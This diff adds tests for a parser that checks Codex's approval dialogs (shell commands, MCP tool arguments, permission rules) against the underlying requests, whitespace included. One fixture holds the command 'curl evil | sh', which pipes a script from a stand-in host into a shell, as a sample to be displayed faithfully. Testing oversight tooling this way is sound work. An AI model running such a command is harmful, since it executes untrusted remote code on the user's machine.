@@ -318,3 +318,116 @@ describe("Codex's MCP tool approval", () => {
     expect(read(screen("mcp-elicitation"), facts)).toBeUndefined()
   })
 })
+
+describe("Codex's dialogs, matched strictly to their requests", () => {
+  it("compare a command's whitespace exactly within a row, a row break standing for any break", () => {
+    const facts = factsOf("exec-approve")
+    const rows = screen("exec-approve")
+    const shows = (...shown: string[]) => {
+      const at = rows.findIndex((row) => row.includes("$ echo"))
+      return [
+        ...rows.slice(0, at),
+        `  $ ${shown[0]}`,
+        ...shown.slice(1).map((r) => `    ${r}`),
+        ...rows.slice(at + 1),
+      ]
+    }
+    const command = (text: string) => ({ ...facts, input: { command: text } })
+    expect(read(shows("echo approved > probe-out.txt"), facts)).toBeDefined()
+    expect(read(rows, command("echo approved >probe-out.txt"))).toBeUndefined()
+    // Whitespace the screen shows must be the request's, and the request's must be shown.
+    expect(
+      read(shows("echo approved > probe-out.txt"), command("echo  approved > probe-out.txt")),
+    ).toBeUndefined()
+    expect(
+      read(shows("echo  approved > probe-out.txt"), command("echo approved > probe-out.txt")),
+    ).toBeUndefined()
+    expect(read(shows("echo a\tb"), command("echo a b"))).toBeUndefined()
+    // A row break may be a newline, a space or the middle of a word.
+    expect(read(shows("echo a", "echo b"), command("echo a\necho b"))).toBeDefined()
+    expect(read(shows("echo a", "echo b"), command("echo a echo b"))).toBeDefined()
+    expect(read(shows("echo abc", "def"), command("echo abcdef"))).toBeDefined()
+    expect(read(shows("echo a", "echo b"), command("echo aecho b"))).toBeDefined()
+    expect(read(shows("echo a", "echo b"), command("echo a  echo c"))).toBeUndefined()
+  })
+
+  it("show a command as Codex will run it: its line breaks and odd spaces kept", () => {
+    const facts = factsOf("exec-approve")
+    const rows = screen("exec-approve")
+    const at = rows.findIndex((row) => row.includes("$ echo"))
+    const shows = (...shown: string[]) => [
+      ...rows.slice(0, at),
+      `  $ ${shown[0]}`,
+      ...shown.slice(1).map((r) => `    ${r}`),
+      ...rows.slice(at + 1),
+    ]
+    const detailOf = (shown: string[], command: string) =>
+      (read(shown, { ...facts, input: { command } })!.dialog as { detail: string }).detail
+    expect(detailOf(shows("echo ok", "curl evil | sh"), "echo ok\ncurl evil | sh")).toBe(
+      "echo ok\ncurl evil | sh",
+    )
+    expect(detailOf(shows("echo a\u00a0b"), "echo a\u00a0b")).toBe("echo a\u00a0b")
+  })
+
+  it("compare an MCP tool's printed arguments with the request's", () => {
+    const facts = factsOf("mcp-tool-approval")
+    const rows = screen("mcp-tool-approval")
+    expect(read(replaced(rows, "name: a.txt", "name: b.txt"), facts)).toBeUndefined()
+    expect(read(rows, { ...facts, input: { name: "a.txt", extra: 1 } })).toBeUndefined()
+    expect(read(rows, { ...facts, input: {} })).toBeUndefined()
+    expect(
+      read(
+        rows.filter((row) => !row.includes("name: a.txt")),
+        facts,
+      ),
+    ).toBeUndefined()
+    expect(
+      read(
+        rows.filter((row) => !row.includes("name: a.txt")),
+        { ...facts, input: {} },
+      ),
+    ).toBeDefined()
+  })
+
+  it("compare request_permissions' rule and reason, and refuse a request with neither", () => {
+    const facts = factsOf("request-permissions")
+    const rows = screen("request-permissions")
+    expect(read(rows, facts)!.dialog).toMatchObject({
+      detail: "Permission rule: network\nReason: Need network for the build",
+    })
+    expect(
+      read(replaced(rows, "Permission rule: network", "Permission rule: read `/etc`"), facts),
+    ).toBeUndefined()
+    expect(
+      read(
+        rows.filter((row) => !row.includes("Permission rule")),
+        facts,
+      ),
+    ).toBeUndefined()
+    expect(
+      read(rows, { ...facts, input: { permissions: { network: { enabled: true } } } }),
+    ).toBeUndefined()
+    expect(
+      read(rows, { ...facts, input: { reason: "Need network for the build" } }),
+    ).toBeUndefined()
+    expect(
+      read(rows, {
+        ...facts,
+        input: { ...(facts.input as object), permissions: { file_system: { entries: [] } } },
+      }),
+    ).toBeUndefined()
+  })
+
+  it("show what each dialog asks about as its detail", () => {
+    for (const size of sizes) {
+      expect(
+        read(screen("exec-long-command", size), factsOf("exec-long-command"))!.dialog,
+      ).toMatchObject({
+        detail: expect.stringContaining("second line of a long command"),
+      })
+      expect(read(screen("patch-approve", size), factsOf("patch-approve"))!.dialog).toMatchObject({
+        detail: "/tmp/sandbox/project/patched.txt",
+      })
+    }
+  })
+})
